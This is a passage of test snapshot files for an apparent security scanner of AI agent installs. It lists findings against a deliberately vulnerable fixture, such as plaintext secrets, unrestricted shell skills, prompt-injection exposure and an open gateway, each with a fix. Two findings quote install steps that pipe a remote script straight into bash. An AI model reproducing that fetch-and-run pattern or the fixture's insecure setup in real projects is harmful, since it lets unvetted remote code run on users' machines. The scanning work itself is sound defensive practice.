+      "message": "Config field 'llm.api_key' holds a literal secret value (sk-…wxyz) instead of an environment-variable reference.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": 6,
+        "detail": "llm.api_key"
+      },
+      "remediation": "Move this value to an environment variable or a secrets manager and reference it indirectly in config (e.g. \${VAR} or env:VAR)."
+    },
+    {
+      "checkId": "CHAP-SEC-001",
+      "title": "Plaintext secrets in config",
+      "severity": "high",
+      "category": "secrets",
+      "owasp": "LLM06: Sensitive Information Disclosure",
+      "message": "Config field 'channels.telegram.bot_token' holds a literal secret value (123…AA11) instead of an environment-variable reference.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": 11,
+        "detail": "channels.telegram.bot_token"
+      },
+      "remediation": "Move this value to an environment variable or a secrets manager and reference it indirectly in config (e.g. \${VAR} or env:VAR)."
+    },
+    {
+      "checkId": "CHAP-SEC-002",
+      "title": "Secrets in a git-tracked path",
+      "severity": "high",
+      "category": "secrets",
+      "owasp": "LLM06: Sensitive Information Disclosure",
+      "message": "The config file holds a literal secret and sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": null,
+        "detail": "config.yaml"
+      },
+      "remediation": "Add the config/secret file to .gitignore, and rotate any key that may already have been committed."
+    },
+    {
+      "checkId": "CHAP-SEC-003",
+      "title": "Overly permissive file permissions",
+      "severity": "medium",
+      "category": "secrets",
+      "owasp": "LLM06: Sensitive Information Disclosure",
+      "message": "The config file is readable by group or other (mode 644), so other local users/processes can read any secrets it holds.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": null,
+        "detail": "mode 644"
+      },
+      "remediation": "Restrict the file to owner-only access, e.g. \`chmod 600\` the config file (and \`chmod 700\` its directory)."
+    },
+    {
+      "checkId": "CHAP-SEC-004",
+      "title": "Secrets likely to reach logs",
+      "severity": "medium",
+      "category": "secrets",
+      "owasp": "LLM06: Sensitive Information Disclosure",
+      "message": "Secrets are likely to reach logs: log level 'debug' is verbose while literal secrets are configured; the log file is readable by group or other.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/logs/agent.log",
+        "line": null,
+        "detail": "logging"
+      },
+      "remediation": "Raise the log level away from debug/trace, redact secrets before logging, and restrict the log file to owner-only access."
+    },
+    {
+      "checkId": "CHAP-SEC-005",
+      "title": "Secret already present in existing log content",
+      "severity": "high",
+      "category": "secrets",
+      "owasp": "LLM06: Sensitive Information Disclosure",
+      "message": "A secret-shaped value for 'api_key' (sk-…real) was found in the existing log file content — a past run appears to have already leaked it, regardless of the current logging configuration.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/logs/agent.log",
+        "line": null,
+        "detail": "api_key"
+      },
+      "remediation": "Rotate the leaked credential, purge or redact the log file, and fix the logging behavior that caused it to be written (see CHAP-SEC-004/CHAP-OBS-002)."
+    },
+    {
+      "checkId": "CHAP-SEC-006",
+      "title": "Sidecar secret file exposed",
+      "severity": "high",
+      "category": "secrets",
+      "owasp": "LLM06: Sensitive Information Disclosure",
+      "message": "Sidecar secret file 'secrets.yaml' holds a literal secret and it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore; it is readable by group or other (mode 644).",
+      "location": {
+        "filePath": "<TARGET_ROOT>/secrets.yaml",
+        "line": null,
+        "detail": "yaml"
+      },
+      "remediation": "Add the file to .gitignore, rotate any key that may already have been committed, and restrict it to owner-only access (chmod 600)."
+    },
+    {
+      "checkId": "CHAP-AGY-001",
+      "title": "Unrestricted shell execution",
+      "severity": "critical",
+      "category": "agency",
+      "owasp": "LLM08: Excessive Agency",
+      "message": "Skill 'command-relay' can execute arbitrary shell commands with no detected command allowlist or confirmation gate.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/command-relay/package.json",
+        "line": null,
+        "detail": "command-relay"
+      },
+      "remediation": "Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution."
+    },
+    {
+      "checkId": "CHAP-AGY-001",
+      "title": "Unrestricted shell execution",
+      "severity": "critical",
+      "category": "agency",
+      "owasp": "LLM08: Excessive Agency",
+      "message": "Skill 'py-cache-cleaner' can execute arbitrary shell commands with no detected command allowlist or confirmation gate.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/py-cache-cleaner/package.json",
+        "line": null,
+        "detail": "py-cache-cleaner"
+      },
+      "remediation": "Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution."
+    },
+    {
+      "checkId": "CHAP-AGY-001",
+      "title": "Unrestricted shell execution",
+      "severity": "critical",
+      "category": "agency",
+      "owasp": "LLM08: Excessive Agency",
+      "message": "Skill 'shell-runner' can execute arbitrary shell commands with no detected command allowlist or confirmation gate.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/shell-runner/package.json",
+        "line": null,
+        "detail": "shell-runner"
+      },
+      "remediation": "Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution."
+    },
+    {
+      "checkId": "CHAP-AGY-002",
+      "title": "Unrestricted filesystem access",
+      "severity": "high",
+      "category": "agency",
+      "owasp": "LLM08: Excessive Agency",
+      "message": "Skill 'file-writer' writes/deletes files with no detected scoping to a fixed workspace directory — it can plausibly read/write anywhere the process can reach.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/file-writer/package.json",
+        "line": null,
+        "detail": "file-writer"
+      },
+      "remediation": "Scope the skill's file access to a dedicated workspace directory and deny path traversal outside it."
+    },
+    {
+      "checkId": "CHAP-AGY-003",
+      "title": "Destructive action without confirmation",
+      "severity": "high",
+      "category": "agency",
+      "owasp": "LLM08: Excessive Agency",
+      "message": "Skill 'file-writer' can perform a destructive/irreversible action (delete) with no declared confirmation gate.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/file-writer/package.json",
+        "line": null,
+        "detail": "file-writer"
+      },
+      "remediation": "Require explicit confirmation before this action runs (or add a dry-run mode) before treating it as safe to invoke."
+    },
+    {
+      "checkId": "CHAP-AGY-003",
+      "title": "Destructive action without confirmation",
+      "severity": "high",
+      "category": "agency",
+      "owasp": "LLM08: Excessive Agency",
+      "message": "Skill 'py-cache-cleaner' can perform a destructive/irreversible action (delete) with no declared confirmation gate.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/py-cache-cleaner/package.json",
+        "line": null,
+        "detail": "py-cache-cleaner"
+      },
+      "remediation": "Require explicit confirmation before this action runs (or add a dry-run mode) before treating it as safe to invoke."
+    },
+    {
+      "checkId": "CHAP-AGY-004",
+      "title": "Broad network egress from a skill",
+      "severity": "medium",
+      "category": "agency",
+      "owasp": "LLM08: Excessive Agency / LLM06",
+      "message": "Skill 'command-relay' can call arbitrary external endpoints — no domain allowlist is declared.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/command-relay/package.json",
+        "line": null,
+        "detail": "command-relay"
+      },
+      "remediation": "Allowlist the specific destination domain(s) this skill needs and log outbound calls."
+    },
+    {
+      "checkId": "CHAP-AGY-004",
+      "title": "Broad network egress from a skill",
+      "severity": "medium",
+      "category": "agency",
+      "owasp": "LLM08: Excessive Agency / LLM06",
+      "message": "Skill 'plugin-loader' can call arbitrary external endpoints — no domain allowlist is declared.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/plugin-loader/package.json",
+        "line": null,
+        "detail": "plugin-loader"
+      },
+      "remediation": "Allowlist the specific destination domain(s) this skill needs and log outbound calls."
+    },
+    {
+      "checkId": "CHAP-AGY-004",
+      "title": "Broad network egress from a skill",
+      "severity": "medium",
+      "category": "agency",
+      "owasp": "LLM08: Excessive Agency / LLM06",
+      "message": "Skill 'web-fetcher' can call arbitrary external endpoints — no domain allowlist is declared.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/web-fetcher/package.json",
+        "line": null,
+        "detail": "web-fetcher"
+      },
+      "remediation": "Allowlist the specific destination domain(s) this skill needs and log outbound calls."
+    },
+    {
+      "checkId": "CHAP-SUP-001",
+      "title": "Skill from an unverified source",
+      "severity": "high",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'command-relay' is not installed at a pinned version/commit (unpinned).",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/command-relay/package.json",
+        "line": null,
+        "detail": "command-relay"
+      },
+      "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+    },
+    {
+      "checkId": "CHAP-SUP-001",
+      "title": "Skill from an unverified source",
+      "severity": "high",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'file-writer' is not installed at a pinned version/commit (unpinned).",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/file-writer/package.json",
+        "line": null,
+        "detail": "file-writer"
+      },
+      "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+    },
+    {
+      "checkId": "CHAP-SUP-001",
+      "title": "Skill from an unverified source",
+      "severity": "high",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'plugin-loader' is not installed at a pinned version/commit (unpinned).",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/plugin-loader/package.json",
+        "line": null,
+        "detail": "plugin-loader"
+      },
+      "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+    },
+    {
+      "checkId": "CHAP-SUP-001",
+      "title": "Skill from an unverified source",
+      "severity": "high",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'py-cache-cleaner' is not installed at a pinned version/commit (unpinned).",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/py-cache-cleaner/package.json",
+        "line": null,
+        "detail": "py-cache-cleaner"
+      },
+      "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+    },
+    {
+      "checkId": "CHAP-SUP-001",
+      "title": "Skill from an unverified source",
+      "severity": "high",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'shell-runner' is not installed at a pinned version/commit (unpinned).",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/shell-runner/package.json",
+        "line": null,
+        "detail": "shell-runner"
+      },
+      "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+    },
+    {
+      "checkId": "CHAP-SUP-001",
+      "title": "Skill from an unverified source",
+      "severity": "high",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'web-fetcher' is not installed at a pinned version/commit (unpinned).",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/web-fetcher/package.json",
+        "line": null,
+        "detail": "web-fetcher"
+      },
+      "remediation": "Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author."
+    },
+    {
+      "checkId": "CHAP-SUP-002",
+      "title": "No integrity verification for skill dependencies",
+      "severity": "medium",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'command-relay' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/command-relay/package.json",
+        "line": null,
+        "detail": "command-relay"
+      },
+      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+    },
+    {
+      "checkId": "CHAP-SUP-002",
+      "title": "No integrity verification for skill dependencies",
+      "severity": "medium",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'file-writer' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/file-writer/package.json",
+        "line": null,
+        "detail": "file-writer"
+      },
+      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+    },
+    {
+      "checkId": "CHAP-SUP-002",
+      "title": "No integrity verification for skill dependencies",
+      "severity": "medium",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'plugin-loader' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/plugin-loader/package.json",
+        "line": null,
+        "detail": "plugin-loader"
+      },
+      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+    },
+    {
+      "checkId": "CHAP-SUP-002",
+      "title": "No integrity verification for skill dependencies",
+      "severity": "medium",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'py-cache-cleaner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/py-cache-cleaner/package.json",
+        "line": null,
+        "detail": "py-cache-cleaner"
+      },
+      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+    },
+    {
+      "checkId": "CHAP-SUP-002",
+      "title": "No integrity verification for skill dependencies",
+      "severity": "medium",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'shell-runner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/shell-runner/package.json",
+        "line": null,
+        "detail": "shell-runner"
+      },
+      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+    },
+    {
+      "checkId": "CHAP-SUP-002",
+      "title": "No integrity verification for skill dependencies",
+      "severity": "medium",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'web-fetcher' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/web-fetcher/package.json",
+        "line": null,
+        "detail": "web-fetcher"
+      },
+      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
+    },
+    {
+      "checkId": "CHAP-SUP-003",
+      "title": "Known-vulnerable dependency",
+      "severity": "high",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'plugin-loader' depends on lodash@^4.17.15 (matched as 4.17.15), which hits 6 known vulnerabilities in Chaperone's offline snapshot (GHSA-29mw-wpgm-hmr9, GHSA-35jh-r3h4-6jhm, GHSA-f23m-r3pf-42rh, GHSA-p6mc-m468-83gw, GHSA-r5fr-rjxr-66jc, GHSA-xxjr-mmjv-4gpg) — most severe: \\"Command Injection in lodash\\" (high), fixed in 4.17.21.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/plugin-loader/package.json",
+        "line": null,
+        "detail": "lodash@^4.17.15"
+      },
+      "remediation": "Upgrade lodash to 4.17.21 or later."
+    },
+    {
+      "checkId": "CHAP-SUP-004",
+      "title": "Dangerous install pattern",
+      "severity": "medium",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/setup.sh | bash) in package.json#scripts.postinstall.",
+      "location": {
+        "filePath": "package.json#scripts.postinstall",
+        "line": null,
+        "detail": "shell-runner"
+      },
+      "remediation": "Review the install script by hand; prefer a vetted, minimal setup with no piped-shell or sudo steps."
+    },
+    {
+      "checkId": "CHAP-SUP-004",
+      "title": "Dangerous install pattern",
+      "severity": "medium",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/bootstrap.sh | bash, sudo, apt-get install) in <TARGET_ROOT>/skills/shell-runner/install.sh.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/shell-runner/install.sh",
+        "line": null,
+        "detail": "shell-runner"
+      },
+      "remediation": "Review the install script by hand; prefer a vetted, minimal setup with no piped-shell or sudo steps."
+    },
+    {
+      "checkId": "CHAP-SUP-005",
+      "title": "Obfuscated or dynamically-evaluated code",
+      "severity": "critical",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'plugin-loader' uses eval()/Function() to run dynamically-constructed code — a common way to hide a malicious payload from static review.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/plugin-loader/package.json",
+        "line": null,
+        "detail": "plugin-loader"
+      },
+      "remediation": "Avoid dynamic code evaluation entirely; if truly needed, review the exact string being evaluated by hand and vendor/pin it rather than constructing it at runtime."
+    },
+    {
+      "checkId": "CHAP-SUP-006",
+      "title": "Typosquat-risk dependency name",
+      "severity": "medium",
+      "category": "supply-chain",
+      "owasp": "LLM05: Supply Chain",
+      "message": "Skill 'plugin-loader' depends on 'reqeust', which is suspiciously close to the well-known package 'request' — possible typosquat.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/plugin-loader/package.json",
+        "line": null,
+        "detail": "reqeust"
+      },
+      "remediation": "Double check that 'reqeust' is the package you actually intend to use, not a typosquat of 'request'."
+    },
+    {
+      "checkId": "CHAP-INJ-001",
+      "title": "Untrusted input flows straight to the model",
+      "severity": "high",
+      "category": "injection",
+      "owasp": "LLM01: Prompt Injection",
+      "message": "At least one inbound message channel is active, but config has no trust boundary marking untrusted content before it reaches the model.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": null,
+        "detail": "trust.mark_untrusted_input"
+      },
+      "remediation": "Mark untrusted inbound content explicitly and keep it separated from system instructions in the prompt; filter before forwarding it to the model."
+    },
+    {
+      "checkId": "CHAP-INJ-002",
+      "title": "Tool output treated as trusted",
+      "severity": "high",
+      "category": "injection",
+      "owasp": "LLM02: Insecure Output Handling",
+      "message": "Skill 'command-relay' traces a network/filesystem result directly into a shell-exec call's argument — a confirmed tool-output-to-shell-execution chain, not just a shape-match.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/skills/command-relay/package.json",
+        "line": null,
+        "detail": "command-relay"
+      },
+      "remediation": "Validate/escape a tool's output before it can drive another tool; never auto-execute model or tool output."
+    },
+    {
+      "checkId": "CHAP-INJ-003",
+      "title": "Actions triggerable by inbound messages without an allowlist",
+      "severity": "high",
+      "category": "injection",
+      "owasp": "LLM01: Prompt Injection / LLM08: Excessive Agency",
+      "message": "At least one inbound message channel is active, but no channel/sender-to-tool allowlist restricts which tools an inbound message can invoke.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": null,
+        "detail": "trust.tool_allowlist"
+      },
+      "remediation": "Restrict which tools each channel/sender can invoke with an explicit allowlist."
+    },
+    {
+      "checkId": "CHAP-INJ-004",
+      "title": "Auto-execution of links/commands from messages",
+      "severity": "high",
+      "category": "injection",
+      "owasp": "LLM01: Prompt Injection",
+      "message": "Config auto-executes links/commands found in inbound messages with no confirmation step.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": null,
+        "detail": "trust.auto_execute_links"
+      },
+      "remediation": "Disable auto-execution of links/commands found in messages; require explicit confirmation instead."
+    },
+    {
+      "checkId": "CHAP-NET-001",
+      "title": "Gateway bound beyond localhost",
+      "severity": "critical",
+      "category": "network",
+      "owasp": "LLM06 / general",
+      "message": "The gateway is bound to '0.0.0.0', not localhost, making it reachable from other hosts on the network.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": null,
+        "detail": "gateway.host"
+      },
+      "remediation": "Bind the gateway to 127.0.0.1/localhost; put anything that must be remote behind a tunnel with authentication."
+    },
+    {
+      "checkId": "CHAP-NET-002",
+      "title": "Missing or weak auth on the gateway control API",
+      "severity": "high",
+      "category": "network",
+      "owasp": "General",
+      "message": "The gateway's control API has weak authentication: the auth token is empty or a common default value.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": null,
+        "detail": "gateway.auth.token"
+      },
+      "remediation": "Require a strong, randomly-generated token for the gateway control API and rotate any default value."
+    },
+    {
+      "checkId": "CHAP-NET-003",
+      "title": "Plaintext transport on the gateway",
+      "severity": "medium",
+      "category": "network",
+      "owasp": "General",
+      "message": "The gateway is configured with TLS disabled, so traffic (including any auth token) travels in plaintext.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": null,
+        "detail": "gateway.tls"
+      },
+      "remediation": "Enable TLS on the gateway and disable any plaintext fallback."
+    },
+    {
+      "checkId": "CHAP-OBS-001",
+      "title": "No audit log of agent actions",
+      "severity": "medium",
+      "category": "observability",
+      "owasp": "LLM08-adjacent",
+      "message": "Logging is configured but the audit log of tool invocations/actions is disabled.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/config.yaml",
+        "line": null,
+        "detail": "logging.audit.enabled"
+      },
+      "remediation": "Enable an append-only audit log of every tool invocation/action the agent takes."
+    },
+    {
+      "checkId": "CHAP-OBS-002",
+      "title": "Sensitive data in plaintext logs",
+      "severity": "medium",
+      "category": "observability",
+      "owasp": "LLM06: Sensitive Information Disclosure",
+      "message": "Logging config does not confirm secrets/message bodies are redacted before being written to logs.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/logs/agent.log",
+        "line": null,
+        "detail": "logging.redact_secrets"
+      },
+      "remediation": "Redact secrets and sensitive message content before logging, and restrict access to the log file."
+    },
+    {
+      "checkId": "CHAP-OBS-003",
+      "title": "No documented kill switch / revocation path",
+      "severity": "low",
+      "category": "observability",
+      "owasp": "General",
+      "message": "No documented quick way to stop the agent and revoke its access was found at the install root.",
+      "location": {
+        "filePath": "<TARGET_ROOT>",
+        "line": null,
+        "detail": "KILL_SWITCH.md / STOP.md / kill-switch.sh / revoke.sh"
+      },
+      "remediation": "Document a kill switch (how to stop the agent) and a script or checklist to revoke/rotate its credentials."
+    },
+    {
+      "checkId": "CHAP-OBS-004",
+      "title": "Persistent memory/state store exposed",
+      "severity": "medium",
+      "category": "observability",
+      "owasp": "LLM06: Sensitive Information Disclosure",
+      "message": "The persistent memory/state store is exposed: it is readable by group or other (mode 755); it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore.",
+      "location": {
+        "filePath": "<TARGET_ROOT>/memory",
+        "line": null,
+        "detail": "memory_dir"
+      },
+      "remediation": "Restrict the memory/state directory to owner-only access (chmod 700) and add it to .gitignore — it can accumulate sensitive conversational content over time."
+    }
+  ],
+  "inspected": [
+    {
+      "path": "<TARGET_ROOT>/config.yaml",
+      "kind": "config"
+    },
+    {
+      "path": "<TARGET_ROOT>/logs/agent.log",
+      "kind": "log-file"
+    },
+    {
+      "path": "<TARGET_ROOT>/secrets.yaml",
+      "kind": "config"
+    },
+    {
+      "path": "<TARGET_ROOT>/.git",
+      "kind": "other"
+    },
+    {
+      "path": "<TARGET_ROOT>/.gitignore",
+      "kind": "gitignore"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/command-relay/package.json",
+      "kind": "skill-manifest"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/command-relay/index.js",
+      "kind": "skill-source"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/file-writer/package.json",
+      "kind": "skill-manifest"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/file-writer/index.js",
+      "kind": "skill-source"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/plugin-loader/package.json",
+      "kind": "skill-manifest"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/plugin-loader/index.js",
+      "kind": "skill-source"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/py-cache-cleaner/package.json",
+      "kind": "skill-manifest"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/py-cache-cleaner/index.py",
+      "kind": "skill-source"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/shell-runner/package.json",
+      "kind": "skill-manifest"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/shell-runner/index.js",
+      "kind": "skill-source"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/shell-runner/install.sh",
+      "kind": "skill-install-script"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/web-fetcher/package.json",
+      "kind": "skill-manifest"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/web-fetcher/index.js",
+      "kind": "skill-source"
+    }
+  ],
+  "skipped": []
+}"
+`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > vulnerable-agent > matches the golden markdown output 1`] = `
+"# Chaperone scan report
+
+**Target:** \`<TARGET_ROOT>\`
+**Scanned at:** <TIMESTAMP> — chaperone v0.1.0
+
+| Severity | Check | Message | Location |
+| --- | --- | --- | --- |
+| Critical | \`CHAP-AGY-001\` | Skill 'command-relay' can execute arbitrary shell commands with no detected command allowlist or confirmation gate. | <TARGET_ROOT>/skills/command-relay/package.json (command-relay) |
+| Critical | \`CHAP-AGY-001\` | Skill 'py-cache-cleaner' can execute arbitrary shell commands with no detected command allowlist or confirmation gate. | <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner) |
+| Critical | \`CHAP-AGY-001\` | Skill 'shell-runner' can execute arbitrary shell commands with no detected command allowlist or confirmation gate. | <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner) |
+| Critical | \`CHAP-SUP-005\` | Skill 'plugin-loader' uses eval()/Function() to run dynamically-constructed code — a common way to hide a malicious payload from static review. | <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader) |
+| Critical | \`CHAP-NET-001\` | The gateway is bound to '0.0.0.0', not localhost, making it reachable from other hosts on the network. | <TARGET_ROOT>/config.yaml (gateway.host) |
+| High | \`CHAP-SEC-001\` | Config field 'llm.api_key' holds a literal secret value (sk-…wxyz) instead of an environment-variable reference. | <TARGET_ROOT>/config.yaml:6 (llm.api_key) |
+| High | \`CHAP-SEC-001\` | Config field 'channels.telegram.bot_token' holds a literal secret value (123…AA11) instead of an environment-variable reference. | <TARGET_ROOT>/config.yaml:11 (channels.telegram.bot_token) |
+| High | \`CHAP-SEC-002\` | The config file holds a literal secret and sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore. | <TARGET_ROOT>/config.yaml (config.yaml) |
+| High | \`CHAP-SEC-005\` | A secret-shaped value for 'api_key' (sk-…real) was found in the existing log file content — a past run appears to have already leaked it, regardless of the current logging configuration. | <TARGET_ROOT>/logs/agent.log (api_key) |
+| High | \`CHAP-SEC-006\` | Sidecar secret file 'secrets.yaml' holds a literal secret and it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore; it is readable by group or other (mode 644). | <TARGET_ROOT>/secrets.yaml (yaml) |
+| High | \`CHAP-AGY-002\` | Skill 'file-writer' writes/deletes files with no detected scoping to a fixed workspace directory — it can plausibly read/write anywhere the process can reach. | <TARGET_ROOT>/skills/file-writer/package.json (file-writer) |
+| High | \`CHAP-AGY-003\` | Skill 'file-writer' can perform a destructive/irreversible action (delete) with no declared confirmation gate. | <TARGET_ROOT>/skills/file-writer/package.json (file-writer) |
+| High | \`CHAP-AGY-003\` | Skill 'py-cache-cleaner' can perform a destructive/irreversible action (delete) with no declared confirmation gate. | <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner) |
+| High | \`CHAP-SUP-001\` | Skill 'command-relay' is not installed at a pinned version/commit (unpinned). | <TARGET_ROOT>/skills/command-relay/package.json (command-relay) |
+| High | \`CHAP-SUP-001\` | Skill 'file-writer' is not installed at a pinned version/commit (unpinned). | <TARGET_ROOT>/skills/file-writer/package.json (file-writer) |
+| High | \`CHAP-SUP-001\` | Skill 'plugin-loader' is not installed at a pinned version/commit (unpinned). | <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader) |
+| High | \`CHAP-SUP-001\` | Skill 'py-cache-cleaner' is not installed at a pinned version/commit (unpinned). | <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner) |
+| High | \`CHAP-SUP-001\` | Skill 'shell-runner' is not installed at a pinned version/commit (unpinned). | <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner) |
+| High | \`CHAP-SUP-001\` | Skill 'web-fetcher' is not installed at a pinned version/commit (unpinned). | <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher) |
+| High | \`CHAP-SUP-003\` | Skill 'plugin-loader' depends on lodash@^4.17.15 (matched as 4.17.15), which hits 6 known vulnerabilities in Chaperone's offline snapshot (GHSA-29mw-wpgm-hmr9, GHSA-35jh-r3h4-6jhm, GHSA-f23m-r3pf-42rh, GHSA-p6mc-m468-83gw, GHSA-r5fr-rjxr-66jc, GHSA-xxjr-mmjv-4gpg) — most severe: "Command Injection in lodash" (high), fixed in 4.17.21. | <TARGET_ROOT>/skills/plugin-loader/package.json (lodash@^4.17.15) |
+| High | \`CHAP-INJ-001\` | At least one inbound message channel is active, but config has no trust boundary marking untrusted content before it reaches the model. | <TARGET_ROOT>/config.yaml (trust.mark_untrusted_input) |
+| High | \`CHAP-INJ-002\` | Skill 'command-relay' traces a network/filesystem result directly into a shell-exec call's argument — a confirmed tool-output-to-shell-execution chain, not just a shape-match. | <TARGET_ROOT>/skills/command-relay/package.json (command-relay) |
+| High | \`CHAP-INJ-003\` | At least one inbound message channel is active, but no channel/sender-to-tool allowlist restricts which tools an inbound message can invoke. | <TARGET_ROOT>/config.yaml (trust.tool_allowlist) |
+| High | \`CHAP-INJ-004\` | Config auto-executes links/commands found in inbound messages with no confirmation step. | <TARGET_ROOT>/config.yaml (trust.auto_execute_links) |
+| High | \`CHAP-NET-002\` | The gateway's control API has weak authentication: the auth token is empty or a common default value. | <TARGET_ROOT>/config.yaml (gateway.auth.token) |
+| Medium | \`CHAP-SEC-003\` | The config file is readable by group or other (mode 644), so other local users/processes can read any secrets it holds. | <TARGET_ROOT>/config.yaml (mode 644) |
